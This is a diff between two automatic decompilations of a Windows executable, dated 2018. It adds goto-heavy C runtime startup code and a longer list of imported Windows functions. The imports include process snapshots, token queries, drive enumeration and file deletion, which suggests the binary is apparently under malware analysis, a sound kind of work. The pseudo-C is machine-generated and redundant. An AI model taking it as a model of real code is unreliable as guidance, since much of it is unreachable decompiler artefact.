+    int32_t v14; // 0x405b39
+    int32_t * moduleHandle; // 0x405b6e
+    if (*v9 != 34) {
+        // 0x405b5c
+        if (*v9 >= 33) {
+            int32_t v15 = v8 + 1; // 0x405b61
+            g7 = v15;
+            while (*(char *)v15 >= 33) {
+                // 0x405b61
+                v15++;
+                g7 = v15;
+                // continue -> 0x405b61
+            }
+            // 0x405b39
+            v11 = g3;
+            v14 = v7;
+            v10 = v15;
+            // branch -> 0x405b39
+          lab_0x405b39_2:
+            // 0x405b39
+            v13 = *(char *)v10;
+            if (v13 != (char)v11) {
+              lab_0x405b3f_3:
+                // 0x405b3f
+                if (v13 < 33) {
+                    // 0x405b35
+                    v12 = v10 + 1;
+                    g7 = v12;
+                    v14 = (int32_t)v13 | v14 & -256;
+                    v10 = v12;
+                    // branch -> 0x405b39
+                    goto lab_0x405b39_2;
+                }
+            }
+            // 0x405b43
+            lpStartupInfo = 0;
+            GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
+            if ((v11 & 1) == 0) {
+                // 0x405b67
+                // branch -> 0x405b6a
+            }
+            // 0x405b6a
+            moduleHandle = GetModuleHandleA((char *)g3);
+            status = function_401000((int32_t)moduleHandle);
+            exit(status);
+            // UNREACHABLE
+        }
+        // 0x405b39
+        v11 = g3;
+        v14 = v7;
+        v10 = v8;
+        // branch -> 0x405b39
+        // 0x405b39
+        v13 = *(char *)v10;
+        if (v13 != (char)v11) {
+            goto lab_0x405b3f_3;
+        }
+        // 0x405b43
+        GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
+        if ((v11 & 1) == 0) {
+            // 0x405b67
+            // branch -> 0x405b6a
+        }
+        // 0x405b6a
+        moduleHandle = GetModuleHandleA((char *)g3);
+        status = function_401000((int32_t)moduleHandle);
+        exit(status);
+        // UNREACHABLE
+    }
+    int32_t v16 = g3;
+    // branch -> 0x405b22
+    int32_t v17; // 0x405b22
+    char * v18; // 0x405b26
+    int32_t v19; // 0x405b26
+    while (true) {
+        // 0x405b22
+        v17 = v8 + 1;
+        g7 = v17;
+        v18 = (char *)v17;
+        unsigned char v20 = *v18; // 0x405b26
+        v19 = (int32_t)v20 | v7 & -256;
+        if (v20 != (char)v16) {
+            // 0x405b2c
+            if (v20 == 34) {
+                // break -> 0x405b30
+                break;
+            }
+            v7 = v19;
+            v8 = v17;
+            // continue -> 0x405b22
+            continue;
+        }
+        // 0x405b30
+        if (*v18 == 34) {
+            // 0x405b35
+            v12 = v17 + 1;
+            g7 = v12;
+            v11 = v16;
+            v14 = v19;
+            v10 = v12;
+            // branch -> 0x405b39
+            goto lab_0x405b39_2;
+        } else {
+            v11 = v16;
+            v14 = v19;
+            v10 = v17;
+        }
+      lab_0x405b39_3:
+        // 0x405b39
+        v13 = *(char *)v10;
+        if (v13 != (char)v11) {
+            goto lab_0x405b3f_3;
+        }
+        // 0x405b43
+        GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
+        if ((v11 & 1) == 0) {
+            // 0x405b67
+            // branch -> 0x405b6a
+            // 0x405b6a
+            moduleHandle = GetModuleHandleA((char *)g3);
+            status = function_401000((int32_t)moduleHandle);
+            exit(status);
+            // UNREACHABLE
+        }
+        // 0x405b56
+        // branch -> 0x405b6a
+        // 0x405b6a
+        moduleHandle = GetModuleHandleA((char *)g3);
+        status = function_401000((int32_t)moduleHandle);
+        exit(status);
+        // UNREACHABLE
+        int32_t lpModuleName = g3; // 0x405b6c
+        moduleHandle = GetModuleHandleA((char *)lpModuleName);
+        status = function_401000((int32_t)moduleHandle);
+        exit(status);
+        // UNREACHABLE
+    }
+    // 0x405b30
+    if (*v18 == 34) {
+        // 0x405b35
+        v12 = v17 + 1;
+        g7 = v12;
+        v11 = v16;
+        v14 = v19;
+        v10 = v12;
+        // branch -> 0x405b39
+        goto lab_0x405b39_3;
+    } else {
+        v11 = v16;
+        v14 = v19;
+        v10 = v17;
+    }
+    // 0x405b39
+    v13 = *(char *)v10;
+    if (v13 != (char)v11) {
+        goto lab_0x405b3f_3;
+    }
+    // 0x405b43
+    GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
+    if ((v11 & 1) == 0) {
+        // 0x405b67
+        // branch -> 0x405b6a
+    }
+    // 0x405b6a
+    moduleHandle = GetModuleHandleA((char *)g3);
+    status = function_401000((int32_t)moduleHandle);
+    exit(status);
     // UNREACHABLE
 }
 
@@ -9295,9 +9516,18 @@ int32_t function_405bf4(void) {
     return __CxxFrameHandler(&v1, &v1, &v1, &v1);
 }
 
+// --------------- Statically Linked Functions ----------------
+
+// int32_t __setdefaultprecision(void);
+
 // --------------- Dynamically Linked Functions ---------------
 
 // EXCEPTION_DISPOSITION __CxxFrameHandler(EHExceptionRecord * pExcept, EHRegistrationNode * pRN, void * pContext, DispatcherContext * pDC);
+// int __getmainargs(int * Argc, char *** Argv, char *** Env, int DoWildCard, _startupinfo * StartInfo);
+// int * __cdecl __p__commode(void);
+// int * __cdecl __p__fmode(void);
+// void __set_app_type(int at);
+// void __setusermatherr(_HANDLE_MATH_ERROR pf);
 // unsigned int __cdecl _controlfp(_In_ unsigned int NewValue, _In_ unsigned int Mask);
 // int32_t _EH_prolog(void);
 // int _except_handler3(PEXCEPTION_RECORD exception_record, PEXCEPTION_REGISTRATION registration, PCONTEXT context, PEXCEPTION_REGISTRATION dispatcher);
@@ -9321,6 +9551,7 @@ int32_t function_405bf4(void) {
 // HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
 // BOOL DeleteFileA(_In_ LPCSTR lpFileName);
 // BOOL DuplicateHandle(_In_ HANDLE hSourceProcessHandle, _In_ HANDLE hSourceHandle, _In_ HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwOptions);
+// void exit(int status);
 // VOID ExitProcess(_In_ UINT uExitCode);
 // int fclose(FILE * stream);
 // BOOL FindClose(_Inout_ HANDLE hFindFile);
@@ -9344,8 +9575,10 @@ int32_t function_405bf4(void) {
 // VOID GetLocalTime(_Out_ LPSYSTEMTIME lpSystemTime);
 // DWORD GetLogicalDriveStringsA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
 // DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
+// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
 // DWORD GetPriorityClass(_In_ HANDLE hProcess);
 // FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
+// VOID GetStartupInfoA(_Out_ LPSTARTUPINFOA lpStartupInfo);
 // LANGID GetSystemDefaultLangID(void);
 // BOOL GetTokenInformation(_In_ HANDLE TokenHandle, _In_ TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, _In_ DWORD TokenInformationLength, _Out_ PDWORD ReturnLength);
 // BOOL GetUserNameA(LPSTR lpBuffer, _Inout_ LPDWORD pcbBuffer);
@@ -9421,4 +9654,4 @@ int32_t function_405bf4(void) {
 // Detected compiler/packer: microsoft linker (6.0)
 // Detected language: C++
 // Detected functions: 124
-// Decompilation date: 2018-06-08 14:15:18
+// Decompilation date: 2018-10-12 20:27:37
